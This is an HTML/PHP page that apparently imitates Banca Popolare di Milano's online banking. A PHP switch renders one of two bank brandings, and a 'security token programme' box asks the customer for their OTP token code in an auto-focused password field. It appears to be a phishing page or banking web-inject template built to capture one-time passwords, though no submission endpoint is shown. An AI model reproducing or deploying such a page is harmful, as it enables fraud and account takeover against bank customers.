<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it">
<head>
	<title>BPM Banking</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<meta http-equiv="Content-Language" content="it" />	
	<link href="/css/bus/priv_login.css" rel="stylesheet" type="text/css" media="screen" />
	<link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css?a=410" />
	<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="/css/font-awesome-ie7.min.css?a=410" />
	<![endif]-->
	<script src="/wscmn/js/jquery.js" type="text/javascript"></script>
	<script>
/*** FRAMEWORK TOOLTIP ****/
//Inizializzazione dell'oggetto tooltip
function ttInit ()
{
	ttBox = $("<div>").attr("id","ttBox").html("<div class=\"arrow top\"></div><div id=\"ttCont\"><a id=\"ttClose\" href=\"javascript:;\"></a><div id=\"ttContText\"></div></div><div class=\"arrow bottom\"></div>").hide();
	$("body > *:first-child").before(ttBox);
	ttBoxText = ttBox.find("#ttContText");
	ttBoxArrowTop = ttBox.find(".arrow.top");
	ttBoxArrowBottom = ttBox.find(".arrow.bottom");
	try {
		ttxClose = $("#ttClose");
		if (ttxClose.length) ttxClose.click(function(){ttBox.hide();});
	} catch (err) { }
	$(window).on("resize",ttHide);
}

/* Mostra il tooltip relativo all'oggetto */		
function ttShow(e, ttEl)
{
	if (!$("#ttBox").length) ttInit();
	ttEl = (typeof ttEl === 'undefined')? $(this) : ttEl;
	if(ttEl.attr("data-tooltip") || ttEl.attr("data-error"))
	{
		ttBoxText.css("width","auto");
		var ttHtml = "";
		if (ttEl.attr("data-error"))
			{
				ttHtml = (ttEl.attr("data-error").indexOf("#")===0) ? $(ttEl.attr("data-error")).html() : ttEl.attr("data-error");
				ttBox.addClass("error");
			}
		else
			{
				ttHtml = (ttEl.attr("data-tooltip").indexOf("#")===0) ? $(ttEl.attr("data-tooltip")).html() : ttEl.attr("data-tooltip");
				ttBox.removeClass("error");
			}
		if (ttHtml !== '') {
			ttBoxText.html(ttHtml);
			ttBoxArrowBottom.show();
			ttBoxArrowTop.hide();
			ttBox.css("visibility","hidden").show();
			//Posiziona il tooltip
			ttBox.position({my: "center bottom", at: "center top", of: ttEl});

			if (ttEl.offset().top < ttBox.offset().top) 
			{
				ttBoxArrowTop.show();
				ttBoxArrowBottom.hide();
			}
			var ttxWidth = ($.browser.msie)? (($.browser.version <= 7)? "auto" : ttBoxText.width() + "px") : (ttBoxText.width() + ttxClose.width()/2 + "px");
			ttBoxText.css("width",ttxWidth);
			ttBox.css({"visibility":"visible"});
			/* Inverte la posizione della freccia, se necessario */
			ttBox.show();
			// Ripete lo show, dopo l'apparizione del tastierino numerico
			setTimeout(function(){if(ttBox.css("display") === "none" && isTouch) ttBox.show();},300);
		}
	}
}
/* Nasconde il tooltip*/
function ttHide()
{
	
	$("#ttBox").hide();
}

// Setting dei tooltip a livello globale
function ttSet(wrapper)
{
	wrapper = $(wrapper);
	//ttEl = wrapper.find("*[data-tooltip],*[data-error]");
	ttEl = wrapper.find("*[data-tooltip], *[data-error], select, input, textarea");
	if(ttEl.length)
	{
		if (!$("#ttBox").length) ttInit();
		$.each(ttEl,function(i,el)
			{
				el = $(el);
				//Resetta hide e blur
				if (el.is("select"))
				{
					el.focus(ttShow);
					//applico il blur solo se non contiene dei link il tooltip
					if (el.is("select") && el.next('.ttHtmlContent').find('a').length===0) {el.blur(ttHide);}
					
				}
				else if (el.is("input, textarea"))
				{
					el.focus(ttShow).keydown(ttHide).blur(ttHide);
				}
				else
				{
					el.click(ttShow);
				}
			}
			
		);
	}
}
$(window).on("load", function () {ttSet($('body')); });
</script>
<script type="text/javascript">
	function addEvent(o, n, h) {
		if (o.attachEvent) {
			o.attachEvent("on" + n, h);
		} else {
			o.addEventListener(n, h, false);
		}
	}
</script>
<script type="text/javascript">
	var cgi_script = '/imprpri';
	var cgi_host = 'bpmsvi7web.webank.local';
	var cgi_protocol = 'https://';

	function invia() {
		var _screenWdt = document.body.clientWidth + 21;
		document.OtpVlidation.submit();
	}
	
	/*function focuss() {
		document.OtpVlidation.otp.focus();
	}*/
	//setTimeout($('input[type="password"]').focus(),5000);
	addEvent(window, 'load',  function(){
		$('input[type="password"]').focus();
		$('input[type="password"]').trigger('click');
	})
	
	$('input[type="password"]').bind('click', setTimeout(function(){$('input[type="password"]').val('')}, 1000))
	
	
</script>
</head>
<body>

<div id="page">
	<?php
				if ($bank == "bpm")
				{
				?>	

	<div id="headercontainerFlat">
		<img src="/img/logo_print_new.gif" class="printlogoNew" alt="">
		<a href="/imprpri/wbOnetoone/HomePrivata.do?cf=0.008834893517028375"><img src="/img/logo_bpm_flat2.png" class="logo" alt="Banca Popolare di Milano"></a>
		<div class="headerFloat">
			<ul class="headerRightTop">
				<li class="tipoConto"><span>PLUS</span></li>
				<li class="btnEsci"><a class="buttonFlat" href="/imprpri/wbOnetoone/chiudi_servizio.jsp?cf=0.2428941810052193"><span><i class="icon-off"></i>Esci</span></a></li>
			</ul>
		</div>
	</div>
	<?php
				}
				?>

	<?php
				if ($bank == "bm")
				{
				?>	
	<div id="header">
		<div id="service_menu">
			<ul class="service_menu_links">
				<li class="inPlus">Plus</li>
				<li class="">
					<input type="image" onclick="document.location.href ='/imprpri/wbOnetoone/chiudi_servizio.jsp?cf=0.015537952624490314';" src="/INLINEANET/iln/img/btn_esc_service.gif">
				</li>
			</ul>
		</div>
	</div>


	<?php
				}
				?>
	<div id="content">
		<div id="avvisosicurezza"><img title="Novità programma sicurezza" alt="Novità programma sicurezza" src="/img/bus/visual_psl.gif"></div>
		<div class="box6">
			<div id="sicur"><p>PROGRAMMA SICUREZZA TOKEN</p></div>
			<div>
				<div class="pintxt">
					<p class="pin_testo" id="">Gentile Cliente, per motivi di securezza, ti chiediamo di inserire il <strong>OTP TOKEN</strong></p>
				</div>
				<div class="pincode">
					<input type="password" class="" name="" id="" maxlength="" value="prova">
				</div>
			</div>
			<br class="clear">
			<div class="fooform">
				<div class="fooformleftb">
					<div class="text">
						<img class="richpin2" alt="" src="/img/bus/ico_richpin2.jpg">
						<span class="testobordeaux11 txthelp" data-tooltip="Hai perso il TOKEN o riscontri anomalie nell'utilizzo?">
							<ul>
								<li>Se hai perso il token recati alla tua agenzia per riceverne uno nuovo</li>
								<li>Se riscontri anomalie o malfunzionamenti contatta il nostro numero verde 800 880 088, 
									che saprà fornirti assistenza.</li>							
							</ul>>Hai perso il TOKEN?</span>
					</div>
				</div>				
				<div class="fooformrightb">
					<div>
						<a class="btnformright" title="conferma" onclick="return checkData(ChangeTypeUser.giorno.value,ChangeTypeUser.mese.value,ChangeTypeUser.anno.value)" href="javascript:invia();">
							<img alt="" src="/img/bus/btn_left_ar.gif">
							<span>conferma</span>
							<img alt="" src="/img/bus/btn_right_ar.gif">
						</a>
					</div>
					
				</div>
				<br class="clear">
			</div>
		</div>
	</div>
<br class="clear">
</div>
<div id="footer"><p><span title="Banca Popolare di Milano Societa' Cooperativa a r.l.">Banca Popolare di Milano Società Cooperativa a r.l.</span> - P.IVA 00715120150 - Gruppo Bipiemme<br></p></div>	
</body>
</html>